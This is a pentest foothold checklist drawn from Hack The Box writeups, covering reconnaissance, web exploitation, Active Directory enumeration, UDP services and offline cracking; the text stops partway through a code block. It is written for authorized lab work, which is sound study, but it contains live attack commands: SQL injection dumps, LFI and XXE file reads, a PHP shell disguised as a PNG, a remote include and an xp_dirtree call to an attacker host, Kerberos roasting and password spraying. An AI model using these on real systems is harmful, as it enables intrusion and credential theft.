# Foothold checklist — 71-machine HTB evidence set

> Use only on systems you are authorized to test. This decision checklist comes from the 71 locally audited official HTB writeups. Replace every uppercase placeholder and log what succeeded, failed, or changed after authentication. Notes/PDF links are local-workspace citations; the official PDFs are not published in the private text-only GitHub mirror.

## Working variables

```bash
export TARGET='10.10.10.10'
export HOST='target.htb'
export DOMAIN='target.htb'
export DC_IP="$TARGET"
export AUTH_USER='user'
export AUTH_PASS='REPLACE_ME'
export ATTACKER='10.10.14.10'
export COMMUNITY='public'
export WORDLIST='/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt'
```

Never leave real passwords in shared shell history. Prefer a prompt, Kerberos ccache, protected environment file, or tool-specific secure input.

## 0. First 15 minutes

- [ ] Save target IP, expected hostname, scope, VPN interface, and route.
- [ ] Run complete TCP discovery, then a targeted version/script scan.
- [ ] Run UDP discovery. TFTP, IKE, SNMP, DNS, and QUIC have been decisive when TCP exposed little.
- [ ] Record DNS/NetBIOS domains, hostnames, TLS SAN/CN names, redirects, and application links.
- [ ] Add confirmed names to `/etc/hosts`; never fuzz a name your machine cannot resolve.
- [ ] Test authentication states separately: anonymous, null, guest, local, domain, certificate, hash, and ticket.
- [ ] Enumerate unauthenticated surface before spraying or exploiting.
- [ ] Search pages, headers, comments, documents, metadata, tickets, shares, source control, and product versions.
- [ ] Validate one hypothesis at a time with the smallest safe proof; save request and response.
- [ ] When a credential appears, re-run every reachable protocol. A new identity changes the visible surface.

```bash
ip route get "$TARGET"
ping -c 1 "$TARGET"                         # no ICMP response does not prove a dead host
sudo nmap -Pn -p- --min-rate 1500 -oA tcp-all "$TARGET"
export PORTS="$(awk -F'Ports: ' '/Ports:/{print $2}' tcp-all.gnmap | tr ',' '\n' \
  | awk -F/ '$2=="open"{gsub(/ /,"",$1); print $1}' | sort -n | paste -sd, -)"
sudo nmap -Pn -sC -sV -O -p "$PORTS" -oA tcp-detail "$TARGET"
sudo nmap -Pn -sU -sV --top-ports 200 --version-intensity 2 -oA udp-top "$TARGET"
```

If `PORTS` is empty, read `tcp-all.nmap` and build it manually; do not let an output-format mismatch silently skip the detailed scan.

## 1. Names, DNS, certificates, and time

- [ ] Follow redirects and note every hostname.
- [ ] Inspect certificates on every TLS port, not only 443.
- [ ] Query DNS records and attempt AXFR against each authoritative server.
- [ ] Compare web hostname, AD DNS domain, and NetBIOS domain.
- [ ] On `KRB_AP_ERR_SKEW`, synchronize time before abandoning the attack.
- [ ] Establish a baseline size/status before vhost fuzzing.

```bash
dig +short A "$HOST" @"$TARGET"
dig +short ANY "$DOMAIN" @"$TARGET"
dig AXFR "$DOMAIN" @"$TARGET"
nslookup -type=SRV "_ldap._tcp.dc._msdcs.$DOMAIN" "$TARGET"
openssl s_client -connect "$TARGET:443" -servername "$HOST" </dev/null 2>/dev/null \
  | openssl x509 -noout -subject -issuer -ext subjectAltName
curl -skI "https://$TARGET/" -H "Host: $HOST"
BASE_SIZE="$(curl -s "http://$TARGET/" -H "Host: invalid.$DOMAIN" | wc -c)"
ffuf -u "http://$TARGET/" -H "Host: FUZZ.$DOMAIN" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs "$BASE_SIZE"
sudo ntpdate "$DC_IP"                       # only when scope permits stepping local time
```

Evidence: [Soccer](./htb-writeups/Soccer.md), [BoardLight](./htb-writeups/BoardLight.md), [Outbound](./htb-writeups/Outbound.md), [Administrator](./htb-writeups/Administrator.md), [Intelligence](./htb-writeups/Intelligence.md).

## 2. Web and HTTP applications

### 2.1 Baseline and content discovery

- [ ] Save headers, cookies, redirects, size, title, framework clues, `robots.txt`, and sitemap.
- [ ] Enumerate stack-relevant extensions: `php`, `aspx`, `jsp`, `json`, `xml`, `txt`, `bak`, `old`, `zip`, `conf`, `yml`.
- [ ] Re-run discovery on every vhost and nonstandard HTTP port.
- [ ] Test alternate methods and unauthenticated API documentation.
- [ ] Inspect HTML/JavaScript for endpoints, parameters, WebSockets, JWT storage, internal names, and source maps.

```bash
curl -skD headers.txt -o body.html "https://$HOST/"
whatweb -a 3 "http://$HOST/"
feroxbuster -u "http://$HOST/" -w "$WORDLIST" \
  -x php,aspx,jsp,json,xml,txt,bak,old,zip,conf,yml -o ferox.txt
ffuf -u "http://$HOST/FUZZ" -w "$WORDLIST" -e .php,.aspx,.json,.txt,.bak,.zip -ac
curl -sk -X OPTIONS -i "https://$HOST/"
rg -n -i 'api|swagger|graphql|websocket|wss?://|token|secret|internal|localhost' body.html
```

### 2.2 Vhosts and server-side routing

- [ ] Treat a default Nginx/Apache/IIS page as a routing clue, not an empty target.
- [ ] Filter vhost fuzzing by size, words, lines, or redirect location.
- [ ] Try confirmed names over HTTP and HTTPS; preserve Host through proxies/tunnels.
- [ ] Note aliases/backends leaked in errors.

```bash
ffuf -u "http://$TARGET/" -H "Host: FUZZ.$DOMAIN" \
  -w /usr/share/seclists/Discovery/DNS/namelist.txt -ac
curl --resolve "$HOST:443:$TARGET" -sk "https://$HOST/"
```

[Soccer](./htb-writeups/Soccer.md) required `soc-player`; [BoardLight](./htb-writeups/BoardLight.md) exposed Dolibarr on a CRM vhost; [Pandora](./htb-writeups/Pandora.md) and [Quick](./htb-writeups/Quick.md) required nonstandard routing/protocol awareness.

### 2.3 Backups, source control, and source review

- [ ] Probe `.git/HEAD`, repository archives, swaps, `.env`, backup suffixes, and source packages.
- [ ] Dump Git objects; inspect all branches, commits, diffs, deleted files, tags, and remotes.
- [ ] Search source for routes, auth logic, serializers, SQL, shell execution, paths, secrets, upload destinations, and localhost checks.
- [ ] Treat compose files as path/network maps; they are not automatically container escape.

```bash
curl -s "http://$HOST/.git/HEAD"
git-dumper "http://$HOST/.git/" source-repo
git -C source-repo log --all --oneline --decorate
git -C source-repo log --all -p -- . ':!*.lock'
git -C source-repo branch -a
rg -n -i 'password|secret|token|jwt|deserialize|unserialize|exec\(|system\(|popen|subprocess|SELECT|localhost|127\.0\.0\.1|upload' source-repo
```

Evidence: [LinkVortex](./htb-writeups/LinkVortex.md), [Dog](./htb-writeups/Dog.md), [Titanic](./htb-writeups/Titanic.md), [Cereal](./htb-writeups/Cereal.md), [UpDown](./htb-writeups/UpDown.md), [Builder](./htb-writeups/Builder.md).

### 2.4 Authentication, sessions, JWTs, and defaults

- [ ] Try product-documented defaults before exploit development without locking accounts.
- [ ] Compare errors/timings in login, reset, registration, and invitation flows.
- [ ] Inspect unauthenticated debug/Actuator/session endpoints.
- [ ] Decode JWT header/payload; note algorithm, key ID, issuer, audience, and verifier key source.
- [ ] Replay a leaked session only in its exact cookie name/path/domain.
- [ ] After assumed-breach login, inspect version and authenticated upload/import/admin routes.

```bash
curl -sk -c cookies.txt -b cookies.txt "https://$HOST/login"
curl -sk "http://$HOST/actuator" | jq .
curl -sk "http://$HOST/actuator/sessions" | jq .
TOKEN='HEADER.PAYLOAD.SIGNATURE'
jwt_part_decode() {
  local part="${1//-/+}"
  part="${part//_/\/}"
  while (( ${#part} % 4 )); do part+='='; done
  printf '%s' "$part" | base64 -d
}
IFS=. read -r JWT_HEADER JWT_PAYLOAD JWT_SIGNATURE <<< "$TOKEN"
jwt_part_decode "$JWT_HEADER" | jq .
jwt_part_decode "$JWT_PAYLOAD" | jq .
```

Evidence: [Keeper](./htb-writeups/Keeper.md), [CozyHosting](./htb-writeups/CozyHosting.md), [Outbound](./htb-writeups/Outbound.md), [Cereal](./htb-writeups/Cereal.md), [Usage](./htb-writeups/Usage.md).

### 2.5 SQL injection — normal, blind, second-order, WebSocket, WAF

- [ ] Save the raw request including CSRF token and cookies.
- [ ] Prove the condition manually before increasing automation level/risk.
- [ ] Determine DBMS, columns, data types, reflection, and whether a later request performs the vulnerable read.
- [ ] When spaces are stripped, test comment substitution and alternate encodings.
- [ ] If HTTP appears clean, inspect WebSocket frames and script its JSON protocol.

```bash
sqlmap -r request.req -p PARAM --batch --level 3 --threads 3
sqlmap -r update.req --second-req=fetch.req -p PARAM --tamper=space2comment \
  --dbms=MySQL --level=5 --batch
sqlmap -u "ws://$HOST:9091" --data '{"id":"*"}' --level 5 --risk 3 --batch --dump
printf '%s' '{"name":"INJECTION"}' | iconv -f UTF-8 -t UTF-16LE > body-utf16.bin
curl -s "http://$HOST/api/ENDPOINT" -H 'Content-Type: application/json; charset=utf-16' \
  --data-binary @body-utf16.bin
```

A 500/502/503 alone is not failure: compare side effects, timing, generated files, and the next read. Evidence: [Soccer](./htb-writeups/Soccer.md), [Help](./htb-writeups/Help.md), [Usage](./htb-writeups/Usage.md), [Intentions](./htb-writeups/Intentions.md), [Multimaster](./htb-writeups/Multimaster.md), [StreamIO](./htb-writeups/StreamIO.md).

### 2.6 File read, traversal, XXE, and includes

- [ ] Prove with a harmless known file, then retrieve source/config that answers the next question.
- [ ] Test normalization, encoding, absolute paths, wrappers, and alternate parameters.
- [ ] For PHP LFI, use `php://filter` to recover source before attempting an include chain.
- [ ] For XXE, start with a local non-secret file.
- [ ] Correlate disclosed paths with compose files, web roots, and service configs.

```bash
curl --path-as-is -s "http://$HOST/download?file=../../../../etc/hostname"
curl -sG "http://$HOST/index.php" \
  --data-urlencode 'file=php://filter/convert.base64-encode/resource=index.php' | base64 -d
cat > xxe.xml <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY read SYSTEM "file:///etc/hostname">]>
<x>&read;</x>
EOF
curl -s "http://$HOST/ENDPOINT" -H 'Content-Type: application/xml' --data-binary @xxe.xml

cat > xxe-windows.xml <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY read SYSTEM "file:///C:/Windows/win.ini">]>
<x>&read;</x>
EOF
curl -s "http://$HOST/ENDPOINT" -H 'Content-Type: application/xml' --data-binary @xxe-windows.xml
```

Evidence: [Markup](./htb-writeups/Markup.md), [ServMon](./htb-writeups/ServMon.md), [Mailing](./htb-writeups/Mailing.md), [Titanic](./htb-writeups/Titanic.md), [Cerberus](./htb-writeups/Cerberus.md), [StreamIO](./htb-writeups/StreamIO.md), [Clicker](./htb-writeups/Clicker.md).

### 2.7 SSRF and loopback-only services

- [ ] Confirm server-side fetch with a listener you control.
- [ ] Sweep a small justified loopback set; compare status, size, and time.
- [ ] Preserve full internal URLs/paths in the preview/import field.
- [ ] For blind SSRF, use callbacks and timing.

```bash
sudo tcpdump -ni tun0 "host $TARGET"
python3 -m http.server 8000 --bind "$ATTACKER"
curl -sG "http://$HOST/PREVIEW" --data-urlencode "url=http://$ATTACKER:8000/probe"
for port in 80 3000 5000 8000 8080 8338; do
  printf '%s ' "$port"
  curl -sG "http://$HOST/PREVIEW" --data-urlencode "url=http://127.0.0.1:$port/" \
    -w '%{http_code} %{size_download} %{time_total}\n' -o /dev/null
done
```

Evidence: [Sau](./htb-writeups/Sau.md), [Editorial](./htb-writeups/Editorial.md), [Cereal](./htb-writeups/Cereal.md), [Clicker](./htb-writeups/Clicker.md).

### 2.8 Upload, import, image, archive, and filename checks

- [ ] Map extension, MIME, magic bytes, content scan, normalization, storage, execution, and post-processing separately.
- [ ] Determine renaming, numeric prefixes, or time/hash-derived filenames.
- [ ] Synchronize to the HTTP `Date` header for time-derived names.
- [ ] Preserve symlinks only when the authorized import flaw explicitly requires it.
- [ ] Do not call upload success until the exact stored path and execution behavior are known.

```bash
curl -sI "http://$HOST/" | rg -i '^date:'
file payload && xxd -l 16 payload
printf '\x89PNG\r\n\x1a\n' > shell.php.png
printf '%s\n' '<?php echo "UPLOAD_OK"; ?>' >> shell.php.png
file shell.php.png
zip -r -y import.zip import-root/
```

Evidence: [Help](./htb-writeups/Help.md), [Networked](./htb-writeups/Networked.md), [BoardLight](./htb-writeups/BoardLight.md), [LinkVortex](./htb-writeups/LinkVortex.md), [Dog](./htb-writeups/Dog.md), [Usage](./htb-writeups/Usage.md), [Atom](./htb-writeups/Atom.md), [Intentions](./htb-writeups/Intentions.md).

### 2.9 Command/template injection and deserialization

- [ ] Reconstruct the server-side expression/command from source or errors.
- [ ] Prove with `id`, delay, or callback before requesting a shell.
- [ ] Check separators, quoting, spaces, `${IFS}`, URL encoding, and field validation independently.
- [ ] For serialization, identify format, allowed types, signature/encryption, and libraries.
- [ ] Prefer application-native types proven by source over generic gadget guessing.
- [ ] For browser-admin flows, confirm localhost reachability and Markdown/CSP encoding.

```bash
curl -sG "http://$HOST/ENDPOINT" --data-urlencode 'value=test;id'
curl -sG "http://$HOST/ENDPOINT" --data-urlencode 'value=test;sleep${IFS}3'
```

Evidence: [Busqueda](./htb-writeups/Busqueda.md), [CozyHosting](./htb-writeups/CozyHosting.md), [Monitored](./htb-writeups/Monitored.md), [Browsed](./htb-writeups/Browsed.md), [Cereal](./htb-writeups/Cereal.md), [Outbound](./htb-writeups/Outbound.md), [Broker](./htb-writeups/Broker.md).

### 2.10 Product/CVE workflow

- [ ] Fingerprint exact product, version, build, module, OS, and architecture.
- [ ] Read the patch/diff or primary advisory; verify prerequisites.
- [ ] Reproduce locally when payload syntax, filename, export, or architecture is strict.
- [ ] Separate the actual CVE from copied-report typos: Broker uses CVE-2023-46604.
- [ ] Record cleanup/state changes before running a proof.

Exactness reminders: ThemeBleed needs the proper DLL export/build/name; Electron metadata must repeat the quoted filename; Icinga needs its real traversal/module paths; ImageMagick needs the expected working directory/library name; mail/document delivery needs host and listener active together.

Sources: [Broker](./htb-writeups/Broker.md), [Aero](./htb-writeups/Aero.md), [Atom](./htb-writeups/Atom.md), [Cerberus](./htb-writeups/Cerberus.md), [Titanic](./htb-writeups/Titanic.md), [Outdated](./htb-writeups/Outdated.md), [Editor](./htb-writeups/Editor.md), [Mailing](./htb-writeups/Mailing.md).

### 2.11 Exact operational gotchas from the audited machines

These are the small details most likely to make a correct idea look broken.

| Machine | Exact cue to preserve |
|---|---|
| [BoardLight](./htb-writeups/BoardLight.md) | Dolibarr's filter is case-sensitive: create/edit a Website page's HTML source with uppercase `<?PHP ... ?>`, then view it. Lowercase `<?php` is rejected. |
| [Outbound](./htb-writeups/Outbound.md) | The base host is default Nginx; fuzz/add `mail.outbound.htb`. CVE-2025-49113 reaches `unserialize` through `_from` in authenticated `upload.php`; preserve the valid Roundcube session. |
| [UpDown](./htb-writeups/UpDown.md) | The dumped `.htaccess` requires exactly `Special-Dev: only4dev` for `dev.siteisup.htb`; without it the vhost intentionally denies access. |
| [Builder](./htb-writeups/Builder.md) | Jenkins CLI `help @file` truncates; use `connect-node @/var/jenkins_home/users/users.xml` and the discovered per-user `config.xml` for complete multiline data. After login, the audited paths are an SSH Agent Pipeline using `sshagent(credentials: ['1'])` or `/script` with `hudson.util.Secret.decrypt(...)`. |
| [StreamIO](./htb-writeups/StreamIO.md) | Read `/admin/?debug=php://filter/convert.base64-encode/resource=index.php`, then `master.php`. Trigger the include by POSTing `include=http://ATTACKER/test.php` to `/admin/?debug=master.php`; direct `master.php` access is blocked. |
| [Aero](./htb-writeups/Aero.md) | ThemeBleed payload DLL must export `VerifyThemeVersion`, compile as **Release x64**, and be renamed exactly `stage_3` in the PoC data directory. |
| [Intentions](./htb-writeups/Intentions.md) | Save update/fetch requests separately and use `--second-req=fetch.req --tamper=space2comment --dbms=MySQL --level=5`. Imagick needs multipart `path=vid:msl:/tmp/php*`, a required arbitrary `effect`, and `file=@payload.msl`; 502/empty may still mean success, so check `/storage/rce.php`. |
| [Atom](./htb-writeups/Atom.md) | Put a single quote in the payload filename (for example `s'hell.exe`) and repeat that exact quoted name in both `url` and `path` in `latest.yml`; version/SHA-512 alone do not bypass validation. |
| [Cerberus](./htb-writeups/Cerberus.md) | Read `/icingaweb2/lib/icinga/icinga-php-thirdparty{file}` with `/etc/icingaweb2/authentication.ini` and `resources.ini`. For RCE, generate RSA with `openssl genrsa`, prepend PHP, set SSH Identity `User` to `../../../../../dev/shm/training/configuration.php`, module path `/dev/shm`, then visit `training`. |
| [Cereal](./htb-writeups/Cereal.md) | The filter blocks generic gadget names; use in-app `Cereal.DownloadHelper` with `URL` and `FilePath=C:\inetpub\source\uploads\cmd.aspx`. Request prefixed `21098374243-cmd.aspx`. In the Markdown XSS, encode XHR parentheses as `\x28`/`\x29`. |
| [Quick](./htb-writeups/Quick.md) | Portal is HTTP/3 on UDP/443. Build quiche examples, use `target/debug/examples/http3-client`, request `https://portal.quick.htb?view=docs`, then fetch `docs/Connectivity.pdf`. |
| [Dog](./htb-writeups/Dog.md) | Backdrop's installer is `?q=/admin/modules/install`, not the clean path. Upload a `tar.gz` containing a module directory, `shell.info`, and `shell.php`, then request `/modules/shell/shell.php`. |
| [Usage](./htb-writeups/Usage.md) | Save the full CSRF/session POST `/forget-password` as `reset.req`; use `sqlmap -r reset.req -p email --batch --level 3`. For Laravel Admin avatar upload, send `shell.jpg` then intercept/change `filename=` to `shell.jpg.php`. |
| [Editorial](./htb-writeups/Editorial.md) | Preview SSRF identifies loopback 5000; fetch exactly `http://127.0.0.1:5000/api/latest/metadata/messages/authors` through the same preview flow. |
| [LinkVortex](./htb-writeups/LinkVortex.md) | Build the Ghost import as `exploit/content/images/NAME.png` and archive with `zip -r -y` so the symlink remains a symlink; ordinary ZIP behavior may dereference it. |
| [Puppy](./htb-writeups/Puppy.md) | If `keepass2john` says file version `40000` unsupported, install/use a current John build and crack with `--format=KeePass`; the old extractor cannot parse the newer/Argon2 database. |
| [Expressway](./htb-writeups/Expressway.md) | Enumerate UDP/69 as well as IKE. `tftp-enum.nse` reveals `ciscortr.cfg`; unauthenticated TFTP retrieval supplies the IKE username/hostname. UDP/161 is closed. |
| [RustyKey](./htb-writeups/RustyKey.md) | A cleanup task reverts the forced password. If TGT acquisition returns `KDC_ERR_PREAUTH_FAILED`, force-change `bb.morgan` again and immediately request a fresh TGT. |
| [Multimaster](./htb-writeups/Multimaster.md) | Encode the JSON body as UTF-16/UTF-32 to bypass the quote-blocking WAF, then use a **five-column** UNION. Exfiltrate `SUSER_SID(...)` bytewise and throttle `SUSER_SNAME(...)` RID resolution. |

## 3. Windows and Active Directory foothold enumeration

### 3.1 SMB — null, guest, and named user are different tests

Null session (blank user and password):

```bash
smbclient -L "//$TARGET" -N
nxc smb "$TARGET" -u '' -p '' --shares
smbmap -H "$TARGET" -u '' -p ''
rpcclient -N -U '' "$TARGET" -c 'srvinfo; enumdomusers; querydispinfo'
```

Guest (literal `guest`, blank password):

```bash
nxc smb "$TARGET" -u guest -p '' --shares
smbclient -L "//$TARGET" -U 'guest%'
rpcclient -U 'guest%' "$TARGET" -c 'enumdomusers; querydispinfo; enumdomgroups'
```

Named identity:

```bash
nxc smb "$TARGET" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" --shares
smbmap -H "$TARGET" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" -R
smbclient "//$TARGET/SHARE" -U "$DOMAIN/$AUTH_USER"
```

- [ ] List every share in every auth state; permissions differ.
- [ ] Recursively inspect `SYSVOL`, `NETLOGON`, HR/onboarding, development, users, backups, and app shares.
- [ ] Test read and write separately.
- [ ] Search XML `cpassword`, scripts, documents, `.lnk`, archives, DBs, configs, and password safes.

```bash
mkdir -p smb-loot && cd smb-loot
smbclient "//$TARGET/SHARE" -N -c 'recurse ON; prompt OFF; mget *'
rg -n -i 'cpassword|password|passwd|secret|token|username|connectionstring' .
```

Evidence: [Active](./htb-writeups/Active.md), [Cicada](./htb-writeups/Cicada.md), [Timelapse](./htb-writeups/Timelapse.md), [Authority](./htb-writeups/Authority.md), [Blackfield](./htb-writeups/Blackfield.md), [Puppy](./htb-writeups/Puppy.md), [APT](./htb-writeups/APT.md).

### 3.2 RPC and SID/RID enumeration

- [ ] Try null, guest, and each low-privilege credential.
- [ ] Query users, descriptions, groups, password policy, and domain SID.
- [ ] Save only `SidTypeUser` principals for spraying.
- [ ] If RPC is blocked but MSSQL works, use SQL SID functions below.

```bash
rpcclient -N -U '' "$TARGET" -c 'lsaquery; enumdomusers; querydispinfo; getdompwinfo'
rpcclient -U "$DOMAIN/$AUTH_USER%$AUTH_PASS" "$TARGET" -c 'lsaquery; enumdomusers; querydispinfo'
impacket-lookupsid -no-pass "$DOMAIN/guest@$TARGET" | tee lookupsid.txt
awk -F'\\\\' '/SidTypeUser/{print $2}' lookupsid.txt | awk '{print $1}' | sort -u > users.txt
```

Evidence: [Cicada](./htb-writeups/Cicada.md), [Heist](./htb-writeups/Heist.md), [Manager](./htb-writeups/Manager.md), [Rebound](./htb-writeups/Rebound.md).

### 3.3 LDAP — RootDSE, anonymous, authenticated

```bash
ldapsearch -x -H "ldap://$DC_IP" -s base -b '' namingContexts defaultNamingContext dnsHostName
export BASE_DN="$(ldapsearch -LLL -x -H "ldap://$DC_IP" -s base -b '' defaultNamingContext \
  | awk '/^defaultNamingContext:/{print $2}')"
ldapsearch -LLL -x -H "ldap://$DC_IP" -b "$BASE_DN" \
  '(|(objectClass=user)(objectClass=group))' sAMAccountName description memberOf
ldapsearch -LLL -x -H "ldap://$DC_IP" -D "$AUTH_USER@$DOMAIN" -W -b "$BASE_DN" \
  '(objectClass=user)' sAMAccountName userPrincipalName description memberOf
windapsearch -d "$DOMAIN" --dc-ip "$DC_IP" -u '' -U
```

- [ ] Query descriptions, SPNs, remote-management membership, gMSAs, delegation, AD CS, and readable LAPS after authentication.
- [ ] Try LDAPS when signing/channel binding is required.
- [ ] Anonymous RootDSE success does not prove anonymous subtree read.

Evidence: [Forest](./htb-writeups/Forest.md), [Monteverde](./htb-writeups/Monteverde.md), [Cascade](./htb-writeups/Cascade.md), [Support](./htb-writeups/Support.md), [Vintage](./htb-writeups/Vintage.md), [Absolute](./htb-writeups/Absolute.md).

### 3.4 Kerberos — usernames, AS-REP, SPNs, clock, DNS

```bash
impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC_IP" -usersfile users.txt -no-pass \
  -format hashcat -outputfile asrep.hashes
impacket-GetUserSPNs "$DOMAIN/$AUTH_USER:$AUTH_PASS" -dc-ip "$DC_IP" -request \
  -outputfile tgs.hashes
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
hashcat -m 13100 tgs.hashes /usr/share/wordlists/rockyou.txt
kinit "$AUTH_USER@$DOMAIN"
klist
```

- [ ] Resolve the DC hostname correctly before ticket operations.
- [ ] Fix skew before abandoning an ACL/SPN path.
- [ ] Test every valid username for AS-REP.
- [ ] Avoid unnecessary SPN/account mutations during roasting.

Evidence: [Forest](./htb-writeups/Forest.md), [Sauna](./htb-writeups/Sauna.md), [Blackfield](./htb-writeups/Blackfield.md), [Administrator](./htb-writeups/Administrator.md), [Rebound](./htb-writeups/Rebound.md).

### 3.5 Password spraying — after policy and cleanup

- [ ] Query lockout threshold/window first.
- [ ] Remove computers, groups, malformed names, and duplicates.
- [ ] Start with evidence-backed candidates: onboarding default, username-as-password, or discovered system password.
- [ ] Spray one candidate, wait the safe interval, and log per protocol.

```bash
nxc smb "$DC_IP" -d "$DOMAIN" -u users.txt -p 'CANDIDATE' --continue-on-success
nxc ldap "$DC_IP" -d "$DOMAIN" -u users.txt -p 'CANDIDATE' --continue-on-success
nxc winrm "$DC_IP" -d "$DOMAIN" -u users.txt -p 'CANDIDATE' --continue-on-success
```

Never high-rate spray a live organization. Evidence: [Cicada](./htb-writeups/Cicada.md), [Monteverde](./htb-writeups/Monteverde.md), [Manager](./htb-writeups/Manager.md), [Flight](./htb-writeups/Flight.md), [EscapeTwo](./htb-writeups/EscapeTwo.md).

### 3.6 MSSQL — SQL-local vs Windows/domain

```bash
# SQL-local account.
nxc mssql "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS" --local-auth
nxc mssql "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS" --local-auth --rid-brute
impacket-mssqlclient "$AUTH_USER:$AUTH_PASS@$TARGET"

# Windows/domain account.
nxc mssql "$TARGET" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS"
impacket-mssqlclient "$DOMAIN/$AUTH_USER:$AUTH_PASS@$TARGET" -windows-auth
```

Inside the SQL client:

```sql
SELECT @@version;
SELECT SYSTEM_USER, USER_NAME(), ORIGINAL_LOGIN();
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT name, type_desc, is_disabled FROM sys.server_principals;
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
EXEC sp_linkedservers;
EXEC master..xp_dirtree 'C:\inetpub\wwwroot', 2, 1;
EXEC master..xp_dirtree '\\ATTACKER_IP\share';
SELECT SUSER_SID('DOMAIN\KnownUser');
-- Strip the final RID from the decoded SID, append a candidate RID:
SELECT SUSER_SNAME(0xDOMAIN_SID_PLUS_CANDIDATE_RID);
```

- [ ] Enumerate impersonation, trustworthy DBs, linked servers, roles, `xp_dirtree`, and `xp_cmdshell` separately.
- [ ] `xp_dirtree` can expose paths or force SMB auth without command execution.
- [ ] SQL `guest` does not imply SMB guest.

Evidence: [Eighteen](./htb-writeups/Eighteen.md), [Escape](./htb-writeups/Escape.md), [Manager](./htb-writeups/Manager.md), [Signed](./htb-writeups/Signed.md), [EscapeTwo](./htb-writeups/EscapeTwo.md), [DarkZero](./htb-writeups/DarkZero.md), [Multimaster](./htb-writeups/Multimaster.md).

### 3.7 Forced authentication and SMB-listener prerequisites

- [ ] Confirm the target can route to `ATTACKER` and that your VPN/firewall permits inbound TCP/445.
- [ ] Bind the listener to the correct interface; do not start Responder blindly on the wrong NIC.
- [ ] Stop conflicting SMB services before starting an SMB server.
- [ ] Use forced authentication only for the authorized machine/workflow and capture the minimum proof.

```bash
ip -br addr show tun0
sudo ss -lntup | rg ':445\b'
sudo responder -I tun0 -v
# Or, when a controlled writable share/file path needs an SMB server:
sudo impacket-smbserver SHARE "$(pwd)" -smb2support
```

Evidence: [Escape](./htb-writeups/Escape.md), [Flight](./htb-writeups/Flight.md), [Fluffy](./htb-writeups/Fluffy.md), [Intelligence](./htb-writeups/Intelligence.md).

### 3.8 WinRM, certificates, SSH, FTP, Telnet

```bash
nxc winrm "$TARGET" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS"
evil-winrm -i "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS"
evil-winrm -i "$TARGET" -c client.crt -k client.key -S
ssh -vvv "$AUTH_USER@$TARGET"
sftp "$AUTH_USER@$TARGET"
ftp "$TARGET"                              # explicitly try anonymous when allowed
telnet "$TARGET" PORT

# Noninteractive anonymous FTP listing/download.
curl --user 'anonymous:anonymous@example.com' "ftp://$TARGET/"
curl --user 'anonymous:anonymous@example.com' "ftp://$TARGET/REMOTE_FILE" -o LOCAL_FILE
```

- [ ] Valid credentials can lack WinRM rights; check `Remote Management Users`.
- [ ] Certificate auth needs matching certificate/private key and often TLS.
- [ ] Preserve Unicode/key formats; convert PuTTY keys for OpenSSH.
- [ ] Use binary transfer for archives, DBs, keys, and executables.

Evidence: [Timelapse](./htb-writeups/Timelapse.md), [Access](./htb-writeups/Access.md), [ServMon](./htb-writeups/ServMon.md), [Keeper](./htb-writeups/Keeper.md), [Voleur](./htb-writeups/Voleur.md).

## 4. UDP and unusual services

### 4.1 SNMP

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt "$TARGET"
snmpwalk -v2c -c "$COMMUNITY" "$TARGET" 1.3.6.1.2.1.1
snmpwalk -v2c -c "$COMMUNITY" "$TARGET" 1.3.6.1.2.1.25.4.2.1.2   # processes
snmpwalk -v2c -c "$COMMUNITY" "$TARGET" 1.3.6.1.2.1.25.4.2.1.5   # arguments
```

Inspect process arguments, users, installed software, and listeners—not only metadata. Sources: [Pandora](./htb-writeups/Pandora.md), [Monitored](./htb-writeups/Monitored.md), [Mentor](./htb-writeups/Mentor.md).

### 4.2 NFS

```bash
showmount -e "$TARGET"
mkdir -p /tmp/target-nfs
sudo mount -t nfs "$TARGET:/EXPORT" /tmp/target-nfs -o nolock
find /tmp/target-nfs -maxdepth 3 -ls
```

Record UID/GID mapping, write access, and `root_squash`; writable does not automatically mean root. Sources: [Puppy](./htb-writeups/Puppy.md), [Clicker](./htb-writeups/Clicker.md).

### 4.3 TFTP and IKE/IPsec

```bash
sudo nmap -sU -p69 --script tftp-enum "$TARGET"
atftp --get --remote-file CONFIG_FILE --local-file CONFIG_FILE "$TARGET"
sudo ike-scan -M -A "$TARGET"
sudo ike-scan -M -A --pskcrack=ike.hash "$TARGET"
hashcat -m 5400 ike.hash /usr/share/wordlists/rockyou.txt
```

TFTP may disclose the identity/hostname needed for IKE. Do not replace this with SNMP when UDP/161 is closed. Source: [Expressway](./htb-writeups/Expressway.md).

### 4.4 HTTP/3 over QUIC

- [ ] Confirm UDP/443 and QUIC/Alt-Svc behavior.
- [ ] Use an HTTP/3-capable client; a conventional TCP client may never reach the app.

```bash
git clone --recursive https://github.com/cloudflare/quiche
cd quiche
cargo build --examples
target/debug/examples/http3-client "https://$HOST/PATH"
```

Source: [Quick](./htb-writeups/Quick.md).

### 4.5 Mail and client-side delivery

```bash
swaks --server "$TARGET" --to "USER@$DOMAIN" --from "tester@$DOMAIN" \
  --header 'Subject: authorized test' --body 'authorized test message'
```

- [ ] Enumerate mail product/version and webmail vhosts.
- [ ] Preserve authenticated sessions for upload/deserialization.
- [ ] In authorized document/link delivery labs, keep required resource and listener active and verify the intended client processed it.

Sources: [Outbound](./htb-writeups/Outbound.md), [Mailing](./htb-writeups/Mailing.md), [Outdated](./htb-writeups/Outdated.md).

## 5. Offline artifact triage

```bash
file ARTIFACT
exiftool ARTIFACT
strings -a ARTIFACT | less
binwalk ARTIFACT
7z l ARTIFACT
zip2john archive.zip > archive.hash
7z2john archive.7z > archive.hash
pfx2john certificate.pfx > pfx.hash
keepass2john database.kdbx > keepass.hash
ansible2john vault.txt > vault.hash
